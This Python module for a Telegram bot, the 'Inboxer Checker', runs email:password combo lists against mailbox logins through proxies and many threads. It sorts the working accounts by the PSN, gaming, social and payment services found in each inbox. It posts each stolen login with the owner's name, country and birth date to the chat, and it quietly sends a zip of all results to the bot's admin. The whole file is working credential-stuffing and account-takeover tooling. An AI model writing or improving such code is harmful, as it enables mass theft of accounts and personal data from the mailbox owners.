import os
import time
import shutil
import zipfile
import tempfile
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from HOME import state
from HOME.helpers import (
    bold, italic, mono, make_progress_bar,
    E_FIRE, E_STOP, E_FILE, E_GEAR, E_CROSS, E_USER, E_PIN, E_CHART,
    E_CLOCK, E_CHECK, E_PARTY, E_BOLT, E_RED, E_YELLOW, E_GREEN,
    E_PURPLE, E_ORANGE, E_DIAMOND, E_ROCKET, E_WARN
)
from API.inbox_engine import check_inbox_account, _service_folder
from CONFIG.config import ADMIN_ID, INBOXER_THREADS
from PROXY.proxy import init_proxies


# ─── Per-combo worker ─────────────────────────────────────────────────────────

def _process_one(cs, email: str, password: str, proxies_list=None):
    st = cs.stats

    result = check_inbox_account(email, password, proxies_list=proxies_list)

    with st.lock:
        st.checked += 1
        if result.get('retries', 0) > 0:
            st.retries += result['retries']

        status = result.get('status', 'error')
        if status == 'hit':
            st.hits += 1
            st.hits_list.append(result)

            # Category counters
            folder_map = result.get('folder_map', {})
            if folder_map.get('PSN'):
                st.psn += 1
            if folder_map.get('Games'):
                st.games += 1
            if folder_map.get('Social'):
                st.social += 1
            if folder_map.get('Apps'):
                st.apps += 1
            if folder_map.get('Payment'):
                st.payment += 1
            if folder_map.get('Proxy'):
                st.proxy_svc += 1

            # Social links
            social_links = result.get('social_links', {})
            if 'TikTok' in social_links:
                st.tiktok_links += 1
            if 'Instagram' in social_links:
                st.instagram_links += 1
            if 'Facebook' in social_links:
                st.facebook_links += 1
            if 'Twitter/X' in social_links:
                st.twitter_links += 1

        elif status == 'bad':
            st.bad += 1
            st.bad_list.append(f"{email}:{password}")
        else:
            st.errors += 1
            st.error_list.append(f"{email}:{password}")

    if status == 'hit':
        _send_live_hit(cs, result)


# ─── Live hit notification ────────────────────────────────────────────────────

def _send_live_hit(cs, result: dict):
    try:
        email = result.get('email', 'N/A')
        password = result.get('password', 'N/A')
        profile = result.get('profile', {})
        services = result.get('services', [])
        social_links = result.get('social_links', {})
        psn_details = result.get('psn_details', {})
        folder_map = result.get('folder_map', {})

        name = profile.get('name', 'Unknown')
        country = profile.get('country', 'Unknown')
        birth_date = profile.get('birth_date', 'Unknown')

        # Build services per folder
        folder_lines = []
        folder_icons = {
            'PSN': '🎮', 'Games': '🕹️', 'Social': '📱',
            'Apps': '📲', 'Payment': '💳', 'Proxy': '🌐',
        }
        for folder, icon in folder_icons.items():
            items = folder_map.get(folder, [])
            if items:
                folder_lines.append(f"{icon} {bold(folder + ':')} {mono(', '.join(items[:5]))}")

        services_block = "\n".join(folder_lines) if folder_lines else mono("No services detected")

        # Social links block
        link_lines = []
        for platform, info in social_links.items():
            link_lines.append(f"🔗 {bold(platform + ':')} {info.get('link', '')}")
        social_block = "\n".join(link_lines) if link_lines else ""

        # PSN block
        psn_block = ""
        if psn_details.get('has_psn'):
            oids = psn_details.get('online_ids', [])
            psn_block = f"\n🎮 {bold('PSN Online IDs:')} {mono(', '.join(oids) if oids else 'N/A')}"

        msg = (
            f"🔥 {bold('HIT! [📬 Inboxer]')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 {bold('Email:')} {mono(email)}\n"
            f"🔑 {bold('Pass:')} {mono(password)}\n"
            f"👤 {bold('Name:')} {mono(name)}\n"
            f"🌍 {bold('Country:')} {mono(country)}\n"
            f"🎂 {bold('BirthDate:')} {mono(birth_date)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{services_block}"
        )
        if psn_block:
            msg += psn_block
        if social_block:
            msg += f"\n{social_block}"
        msg += f"\n━━━━━━━━━━━━━━━━━━━━━━\n{E_GEAR} {italic('Dev: @RBX404')}"

        chat_id = getattr(cs, 'chat_id', None)
        if chat_id:
            state.bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass


# ─── Status / Summary messages ────────────────────────────────────────────────

def _build_status_msg(cs) -> str:
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    eta_s = ((st.total - st.checked) / (st.checked / elapsed)) if st.checked > 0 and elapsed > 0 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_s)) if eta_s > 0 else "--:--:--"
    bar = make_progress_bar(st.checked, st.total, 20)

    return f"""{E_ROCKET} {bold('📬 Inboxer Checker')}
{E_GEAR} {italic('Dev: @RBX404')}

{E_CHART} {bold('Progress:')}
{mono(bar)}
{mono(f'{st.checked}/{st.total}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)} | ETA: {mono(eta_str)}

{E_FIRE} {bold('Hits:')} {mono(str(st.hits))}
━━━━━━━━━━━━━━━━━━━━━━━━
🎮 {bold('PSN:')} {mono(str(st.psn))}   🕹️ {bold('Games:')} {mono(str(st.games))}
📱 {bold('Social:')} {mono(str(st.social))}   📲 {bold('Apps:')} {mono(str(st.apps))}
💳 {bold('Payment:')} {mono(str(st.payment))}   🌐 {bold('Proxy:')} {mono(str(st.proxy_svc))}
━━━━━━━━━━━━━━━━━━━━━━━━
🎵 {bold('TikTok Links:')} {mono(str(st.tiktok_links))}   📸 {bold('IG Links:')} {mono(str(st.instagram_links))}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('Errors:')} {mono(str(st.errors))}
{E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_GEAR} {italic('Dev: @RBX404')}"""


def _build_summary_msg(cs, stopped=False) -> str:
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    status_text = f"{E_STOP} Stopped by user" if stopped else f"{E_CHECK} Completed"

    return f"""{E_PARTY} {bold('📬 Inboxer — Summary')}
{E_GEAR} {italic('Dev: @RBX404')}

{bold('Status:')} {status_text}

{E_CHART} {bold('Stats:')}
{mono(f'Total Combos: {st.total}')}
{mono(f'Checked: {st.checked}')}
{mono(f'CPM: {cpm}')}
{mono(f'Duration: {el_str}')}

{E_FIRE} {bold('Hits:')} {mono(str(st.hits))}
━━━━━━━━━━━━━━━━━━━━━━━━
🎮 {bold('PSN:')} {mono(str(st.psn))}   🕹️ {bold('Games:')} {mono(str(st.games))}
📱 {bold('Social:')} {mono(str(st.social))}   📲 {bold('Apps:')} {mono(str(st.apps))}
💳 {bold('Payment:')} {mono(str(st.payment))}   🌐 {bold('Proxy:')} {mono(str(st.proxy_svc))}
━━━━━━━━━━━━━━━━━━━━━━━━
🎵 {bold('TikTok Links:')} {mono(str(st.tiktok_links))}   📸 {bold('IG Links:')} {mono(str(st.instagram_links))}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('Errors:')} {mono(str(st.errors))}
{E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}

{E_GEAR} {italic('Dev: @RBX404')}"""


# ─── Result ZIP builder ───────────────────────────────────────────────────────

_BY = "@RBX404"

# social platform → link subfolder name (matches inbox.py)
_LINK_FOLDERS = {
    "TikTok":    "TikTok_Links",
    "Instagram": "Instagram_Links",
    "Facebook":  "Facebook_Links",
    "Twitter/X": "Twitter_Links",
}


def _append_file(folder: str, filename: str, line: str):
    """Append a line to a file — multiple hits accumulate in the same service file."""
    try:
        with open(os.path.join(folder, filename), 'a', encoding='utf-8') as f:
            f.write(line + "\n")
    except:
        pass


def _build_result_zip(cs, user=None) -> tuple:
    st = cs.stats
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tmpdir = tempfile.mkdtemp(prefix="ib_")
    rdir = os.path.join(tmpdir, "Results")   # top-level Results/ — mirrors inbox.py

    # Create all sub-folders matching inbox.py
    sub_folders = [
        'PSN', 'General', 'Games', 'Social', 'Apps', 'Payment', 'Proxy',
        'TikTok_Links', 'Instagram_Links', 'Facebook_Links', 'Twitter_Links',
    ]
    fp = {}   # folder_name → path
    for fd in sub_folders:
        p = os.path.join(rdir, fd)
        os.makedirs(p, exist_ok=True)
        fp[fd] = p
    os.makedirs(rdir, exist_ok=True)   # ensure rdir itself exists

    for result in st.hits_list:
        email       = result.get('email', 'unknown')
        password    = result.get('password', '')
        services    = result.get('services', [])
        social_links = result.get('social_links', {})
        psn_details  = result.get('psn_details', {})
        info_line   = result.get('info_line', f"Email: {email} | Pass: {password}")

        # ── General_Hits_By_BaignX.txt — every hit ──
        _append_file(fp['General'], f"General_Hits_By_{_BY}.txt", info_line)

        # ── All_Hits_By_BaignX.txt (root) — email:pass ──
        _append_file(rdir, f"All_Hits_By_{_BY}.txt", f"{email}:{password}")

        # ── Per-service files  ({Service}_By_BaignX.txt) ──
        for svc in services:
            folder_name = _service_folder(svc)
            if folder_name in fp:
                _append_file(fp[folder_name], f"{svc}_By_{_BY}.txt", info_line)

        # ── PSN details ──
        if psn_details.get('has_psn'):
            oids   = psn_details.get('online_ids', [])
            orders = psn_details.get('orders', 0)
            psn_line = (
                f"{info_line}\n"
                f"Online ID: {', '.join(oids) if oids else 'Not Found'}\n"
                f"Orders: {orders}"
            )
            _append_file(fp['PSN'], f"PSN_Details_By_{_BY}.txt", psn_line)

        # ── Social links  ({Platform}_Links_By_BaignX.txt) ──
        for platform, info in social_links.items():
            lf = _LINK_FOLDERS.get(platform)
            if lf and lf in fp:
                username = info.get('username', '')
                link     = info.get('link', '')
                _append_file(fp[lf], f"{platform}_Links_By_{_BY}.txt",
                             f"{email}:{password} | @{username} | {link}")

    # Bad / errors in root Results
    if st.bad_list:
        with open(os.path.join(rdir, "bad.txt"), 'w', encoding='utf-8') as f:
            f.write("\n".join(st.bad_list))
    if st.error_list:
        with open(os.path.join(rdir, "errors.txt"), 'w', encoding='utf-8') as f:
            f.write("\n".join(st.error_list))

    # Summary
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    checked_by = "N/A"
    checked_by_link = ""
    if user:
        checked_by = (f"{user.first_name or ''} {user.last_name or ''}".strip() or "User")
        checked_by_link = f"@{user.username}" if user.username else f"tg://user?id={user.id}"

    summary = "\n".join([
        f"Inboxer — Summary | Dev: {_BY}", "",
        f"Checked by : {checked_by} ({checked_by_link})",
        f"Date       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "",
        f"Total      : {st.total}",
        f"Checked    : {st.checked}",
        f"CPM        : {cpm}",
        f"Duration   : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}", "",
        "--- RESULTS ---",
        f"Hits       : {st.hits}", "",
        "--- CATEGORIES ---",
        f"PSN        : {st.psn}",
        f"Games      : {st.games}",
        f"Social     : {st.social}",
        f"Apps       : {st.apps}",
        f"Payment    : {st.payment}",
        f"Proxy      : {st.proxy_svc}", "",
        "--- SOCIAL LINKS ---",
        f"TikTok     : {st.tiktok_links}",
        f"Instagram  : {st.instagram_links}",
        f"Facebook   : {st.facebook_links}",
        f"Twitter    : {st.twitter_links}", "",
        "--- BAD/ERRORS ---",
        f"Bad        : {st.bad}",
        f"Errors     : {st.errors}",
        f"Retries    : {st.retries}",
    ])
    with open(os.path.join(rdir, "summary.txt"), 'w', encoding='utf-8') as f:
        f.write(summary)

    zip_path = os.path.join(tmpdir, f"inbox_{ts}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(rdir):
            for file in files:
                full = os.path.join(root, file)
                zf.write(full, os.path.relpath(full, tmpdir))

    return zip_path, tmpdir


# ─── Main runner ─────────────────────────────────────────────────────────────

def run_inbox_checker(cs, message, user):
    chat_id = message.chat.id
    cs.chat_id = chat_id

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"ib_get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop",    callback_data=f"ib_stop_{cs.user_id}")
    )

    status_msg = state.bot.send_message(
        chat_id, _build_status_msg(cs),
        parse_mode="HTML", reply_to_message_id=message.message_id,
        reply_markup=markup, disable_web_page_preview=True
    )
    cs.msg_id = status_msg.message_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                m2 = types.InlineKeyboardMarkup(row_width=2)
                m2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"ib_get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop",    callback_data=f"ib_stop_{cs.user_id}")
                )
                state.bot.edit_message_text(
                    _build_status_msg(cs),
                    chat_id=chat_id, message_id=cs.msg_id,
                    parse_mode="HTML", reply_markup=m2, disable_web_page_preview=True
                )
            except:
                pass
            time.sleep(3)

    threading.Thread(target=updater, daemon=True).start()

    proxies_list = init_proxies()
    executor = ThreadPoolExecutor(max_workers=INBOXER_THREADS, thread_name_prefix="ibchk")
    cs.executor = executor
    try:
        futures = []
        for email, password in cs.combos:
            if cs.stop_event.is_set():
                break
            futures.append(executor.submit(_process_one, cs, email, password, proxies_list))
        cs.futures = futures

        for f in as_completed(futures):
            if cs.stop_event.is_set():
                for fut in futures:
                    fut.cancel()
                try:
                    executor.shutdown(wait=False, cancel_futures=True)
                except TypeError:
                    executor.shutdown(wait=False)
                break
            try:
                f.result(timeout=0.1)
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass

    cs.finished = True
    stopped = cs.stop_event.is_set()

    # Send summary immediately (fast message edit)
    try:
        state.bot.edit_message_text(
            _build_summary_msg(cs, stopped),
            chat_id=chat_id, message_id=cs.msg_id,
            parse_mode="HTML", disable_web_page_preview=True
        )
    except Exception:
        pass

    # Send zip results in daemon thread — never block bot on file I/O or Telegram upload
    def _send_results():
        try:
            zip_path, tmpdir = _build_result_zip(cs, user=user)
            with open(zip_path, 'rb') as f:
                state.bot.send_document(
                    chat_id, f,
                    caption=f"{E_FILE} {bold('Inbox Results')} | {italic('Dev: @RBX404')}",
                    parse_mode="HTML", reply_to_message_id=message.message_id
                )
            with open(zip_path, 'rb') as f:
                user_profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
                user_name = (f"{user.first_name or ''} {user.last_name or ''}".strip() or "User")
                st = cs.stats
                admin_cap = (
                    f"{E_FILE} {bold('Inbox Check Completed')}\n"
                    f"{E_USER} Checked by: <a href=\"{user_profile_link}\">{user_name}</a>\n"
                    f"{E_PIN} User ID: {mono(str(user.id))}\n"
                    f"{E_CHART} Combos: {mono(str(st.total))} | Hits: {mono(str(st.hits))}\n"
                    f"🎮 PSN: {mono(str(st.psn))} | 🕹️ Games: {mono(str(st.games))} | "
                    f"📱 Social: {mono(str(st.social))}\n"
                    f"{E_CLOCK} Duration: {mono(time.strftime('%H:%M:%S', time.gmtime(time.time() - cs.started)))}\n"
                    f"{E_GEAR} {italic('Dev: @RBX404')}"
                )
                state.bot.send_document(ADMIN_ID, f, caption=admin_cap, parse_mode="HTML")
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass
        except Exception as e:
            try:
                state.bot.send_message(chat_id, f"{E_CROSS} Error sending results: {mono(str(e))}", parse_mode="HTML")
            except Exception:
                pass

    threading.Thread(target=_send_results, daemon=True).start()

    with state.active_checks_lock:
        ib_key = f"ib_{cs.user_id}"
        if ib_key in state.active_checks:
            del state.active_checks[ib_key]
